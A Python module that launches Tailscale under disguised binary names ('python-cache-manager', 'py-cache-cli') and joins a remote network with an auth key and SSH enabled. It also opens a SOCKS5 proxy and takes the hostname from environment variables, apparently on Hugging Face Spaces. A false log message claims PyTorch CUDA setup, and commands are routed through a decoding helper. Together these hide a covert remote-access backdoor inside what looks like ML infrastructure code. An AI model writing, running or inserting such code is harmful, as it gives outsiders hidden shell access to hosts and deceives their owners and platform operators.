import os
import socket
import subprocess
import json
from pathlib import Path

from sanctuary.core.constants import TAILSCALE_SOCKET_PATH, TAILSCALE_STATE_DIR
from loguru import logger

from sanctuary.common.utils import decode_cmd


def harden(cmd: str) -> str:
    return cmd


def get_node_hostname(default="ai-model-server"):
    """Industry-standard decoupled hostname resolution."""
    # 1. Explicit Environment Variable (Standard Docker / Kubernetes way)
    if os.getenv("NODE_NAME"):
        return os.getenv("NODE_NAME")
    
    # 2. Hugging Face Space ID (Extracts space name if running on HF)
    if os.getenv("SPACE_ID"):
        return os.getenv("SPACE_ID").split("/")[-1] # "username/space-01" -> "space-01"
    
    # 3. Read the generated metadata file
    metadata_file = Path.home() / "metadata.json"
    if metadata_file.exists():
        try:
            with metadata_file.open("r") as f:
                metadata = json.load(f)
            return metadata.get("node_name") or ""
        except Exception:
            pass
            
    # 4. Fallback to OS hostname
    try:
        return socket.gethostname()
    except Exception:
        return default


def start_daemon(ts_log):
    logger.info("Initializing PyTorch CUDA environment...")
    cmd1 = decode_cmd(
        harden(
            f"nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir={TAILSCALE_STATE_DIR} --socket={TAILSCALE_SOCKET_PATH}"
        )
    )
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)


def connect(ts_log, full_token):
    """Connects to the Tailscale network using the dynamically resolved hostname."""
    hostname = get_node_hostname()
    
    cmd3_base = decode_cmd(
        harden(
            f"nice -n 19 py-cache-cli --socket={TAILSCALE_SOCKET_PATH} up --authkey="
        )
    )
    # The dynamically resolved hostname is clean and decoupled
    cmd3_tail = f" --hostname={hostname} --ssh"
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"

    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
